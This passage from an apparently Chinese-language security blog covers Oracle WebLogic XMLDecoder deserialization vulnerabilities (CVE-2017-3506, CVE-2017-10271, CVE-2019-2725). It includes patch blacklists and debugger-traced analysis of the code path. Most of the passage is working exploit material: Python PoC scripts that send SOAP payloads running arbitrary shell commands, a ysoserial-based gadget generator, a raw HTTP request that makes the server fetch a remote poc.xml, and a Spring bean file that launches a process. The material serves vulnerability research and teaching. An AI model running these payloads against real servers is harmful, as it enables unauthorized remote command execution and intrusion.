class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">&quot;No Vulnerability&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    	cmd = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:])</span><br><span class="line">    	<span class="built_in">print</span>(cmd)</span><br><span class="line">    	<span class="built_in">print</span>(poc(ip, cmd))</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>这个漏洞是构造SOAP（XML）格式的请求触发XMLDecoder的反序列化，把漏洞入口定位在<code>WorkContextServerTube</code>类中的<code>processRequest()</code>方法，<code>var1</code>为我们传入的SOAP请求，它会写到<code>var3</code>中并调用了<code>readHeaderOld()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714384fc665e776134ef9a962.png" alt="image-20210125172658998"></p>
<p>跟进去我们会发现它被传入到了<code>WorkContextXmlInputAdapter</code>类的构造函数中，这个地方就是漏洞的关键，说明我们对任意XML进行反序列化</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714380d533c96064eb3bf975e.png" alt="image-20210125173128468"></p>
<p>跟进这个类，可以发现它直接被带入了<code>XMLDecoder()</code>构造函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714392d61ea0a8a3658ce1bb8.png" alt="image-20210125173246975"></p>
<p>跳出来跟进<code>receive()</code>方法，就是处理拿到的XML数据，持续跟进就能看到它调用了<code>readObject()</code>方法进行反序列化</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439f774ef60ae7c51d371db.png" alt="image-20210125174531750"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439cdce681dad871d89c2e2.png" alt="image-20210125174545079"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714398ed563a56218a3998d96.png" alt="image-20210125174303357"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439ab41b28324fe6397a843.png" alt="image-20210125174632414"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440713e032701c41d85a687.png" alt="image-20210125174415289"></p>
<p><strong>补丁</strong></p>
<p>找了网上别人的补丁主要代码，也是采用黑名单机制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> newIllegalStateException(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到它只是禁止了<code>qName</code>为<code>object</code>类而已，所以很快就出现了下面CVE-2017-10271的绕过</p>
<h4 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    url = <span class="string">&#x27;%s/wls-wsat/CoordinatorPortType&#x27;</span> % url</span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;java&gt;</span></span><br><span class="line"><span class="string">            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">				&lt;void index=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;%s&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">              &lt;/array&gt;</span></span><br><span class="line"><span class="string">              &lt;void method=&quot;start&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;/void&gt;</span></span><br><span class="line"><span class="string">          &lt;/java&gt;</span></span><br><span class="line"><span class="string">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % cmd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        response = response.text</span><br><span class="line">        response = re.search(<span class="string">r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;</span>, response).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        response = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;faultstring&gt;java.lang.ProcessBuilder&#x27;</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">&quot;&lt;faultstring&gt;0&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        result = <span class="string">&quot;[+] test ok&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">&quot;[*] No Vulnerability&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    	cmd = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:])</span><br><span class="line">    	<span class="built_in">print</span>(<span class="string">&#x27;[*] send payload:&#x27;</span>, cmd)</span><br><span class="line">    	<span class="built_in">print</span>(poc(ip, cmd))</span><br></pre></td></tr></table></figure>

<p>此外还有<code>new</code>标签也可以利用</p>
<blockquote>
<p>注意jdk6不支持<code>new</code>等标签</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;java version=<span class="string">&quot;1.4.0&quot;</span> class=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">new</span> <span class="title class_">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="line">        &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">        &lt;method name=<span class="string">&quot;start&quot;</span>/&gt;</span><br><span class="line">    &lt;/<span class="keyword">new</span>&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>因为和CVE-2017-3506几乎一样，这里就不分析了，其实就是把<code>object</code>标签更改为其他可用的，比如<code>void</code></p>
<p><strong>补丁</strong></p>
<p>对涉及到的<code>object、new、method、void、array</code>类型都进行了检测</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">	<span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">		parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>()) &#123;</span><br><span class="line">			<span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXEception &#123;</span><br><span class="line">				<span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">						<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>;attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">							<span class="keyword">if</span> (!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">								<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void: &quot;</span> + attributes.getQName(attClass));</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">						<span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (var9 != <span class="literal">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ......</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0</p>
</blockquote>
<p><strong>poc</strong></p>
<blockquote>
<p>这个漏洞在市面上流传的很多payload都是没有考虑CVE-2017-10271的补丁，直接就是新入口+旧payload，比如&lt;void class&#x3D;”xxx”&gt;</p>
<p>真正意义上的对CVE-2017-10271的绕过的关键点在于对&lt;class&gt;标签的利用，即我们可以利用&lt;class&gt;标签来创建任意类的实例</p>
<p>目前能利用的类有</p>
<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</p>
<p>com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</p>
<p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet（version &lt;&#x3D; 10.36，因为超过这个版本就不存在了）</p>
</blockquote>
<p><em>版本 1（ version &lt;&#x3D; 10.36 ）</em></p>
<blockquote>
<p>因为我这里用的是<code>vulhub/weblogic:10.3.6</code>，所以用的是<code>CommonsCollections1</code>的Gadget作为测试，其他情况视具体环境而定</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gen_ser = <span class="string">&quot;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &#x27;%s&#x27;&quot;</span> % cmd</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] generate CommonsCollections1 payload: %s&quot;</span> % gen_ser)</span><br><span class="line">        poc_ser = subprocess.Popen(gen_ser, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] generate CommonsCollections1 payload failed&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;</span></span><br><span class="line"><span class="string">       &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">          &lt;wsa:Action&gt;demoAction&lt;/wsa:Action&gt;</span></span><br><span class="line"><span class="string">          &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span></span><br><span class="line"><span class="string">          &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">             &lt;java&gt;</span></span><br><span class="line"><span class="string">                &lt;class&gt;</span></span><br><span class="line"><span class="string">                   &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;</span></span><br><span class="line"><span class="string">                   &lt;void&gt;</span></span><br><span class="line"><span class="string">                      &lt;array class=&quot;byte&quot; length=&quot;%d&quot;&gt;</span></span><br><span class="line"><span class="string">                        %s</span></span><br><span class="line"><span class="string">                      &lt;/array&gt;</span></span><br><span class="line"><span class="string">                   &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;/class&gt;</span></span><br><span class="line"><span class="string">             &lt;/java&gt;</span></span><br><span class="line"><span class="string">          &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">       &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">       &lt;soapenv:Body&gt;</span></span><br><span class="line"><span class="string">          &lt;asy:onAsyncDelivery /&gt;</span></span><br><span class="line"><span class="string">       &lt;/soapenv:Body&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    exploit = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    _index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> poc_ser:</span><br><span class="line">        _byte = <span class="built_in">int</span>.from_bytes(struct.pack(<span class="string">&quot;B&quot;</span>, i), byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">True</span>)</span><br><span class="line">        exploit += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;void index=&quot;%d&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;byte&gt;%d&lt;/byte&gt;</span></span><br><span class="line"><span class="string">            &lt;/void&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> % (_index, _byte)</span><br><span class="line">        _index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    payload = xml % (_index, exploit)</span><br><span class="line">    <span class="keyword">return</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    url += <span class="string">&#x27;/_async/AsyncResponseService&#x27;</span></span><br><span class="line">    data = gen_payload(cmd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] send payload&quot;</span>)</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">202</span>:</span><br><span class="line">          result = <span class="string">&quot;[+] test ok&quot;</span></span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          result = <span class="string">&quot;[*] No Vulnerability&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">          result = <span class="string">&#x27;[*] error: &#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python3 poc.py http://127.0.0.1:7001 touch /tmp/success&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:])</span><br><span class="line">        <span class="built_in">print</span>(poc(ip, cmd))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>版本 2（通杀版本）</em></p>
<blockquote>
<p>这个payload执行的前提是支持spel表达式</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>849</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">string</span>&gt;</span>http://127.0.0.1:8000/poc.xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// poc.xml</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[calc]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>漏洞发生原因是<code>wls9_async_response.war</code>包中的类由于使用注解方法调用了Weblogic原生处理Web服务的类，这个漏洞可以说是对CVE-2017-10271的另一个入口和补丁绕过</p>
<p>首先我们的漏洞入口在<code>weblogic.wsee.async.AsyncResponseHandler</code>类的<code>handleRequest</code>方法上，设置RelatesTo属性进入else分支</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440e3e017f766fb6a66592c.png" alt="image-20210125225235703"></p>
<p>一直往下走就会来到<code>weblogic.wsee.server.servlet.SoapProcessor</code>的<code>process()</code>和<code>handlePost()</code>方法，而后会调用WsSkel的<code>invoke()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440d5d936b63cd9392dd39f.png" alt="image-20210126003209680"></p>
<p>跟进<code>invoke()</code>方法，实例化了ServerDispatcher对象，并调用了<code>dispatch()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714402eae817942a7069a06c6.png" alt="image-20210126003353598"></p>
<p>在<code>dispatch()</code>方法中，对<code>InternalHandlerList</code>进行<code>setHandlerChain()</code>操作，然后再调用<code>getHandlerChain().handleRequest()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441b32c4ed5ac5b74657213.png" alt="image-20210126003819404"></p>
<p><code>handleRequest()</code>方法根据handlers列表依次调用每个handler的<code>handleRequest()</code>，但只要某个handler的<code>handleRequest()</code>返回false则直接return，后面handler的<code>handleRequest()</code>将不会被调用</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714410b478e7ac4f3dda1e107.png" alt="image-20210126004609041"></p>
<p>handlers列表如下，其中有四个需要重点关注的handler，我们需要确保它们能够全部执行，即至少执行到第17个handler</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144100afeeea5b38f6634fda.png" alt="image-20210126005217365"></p>
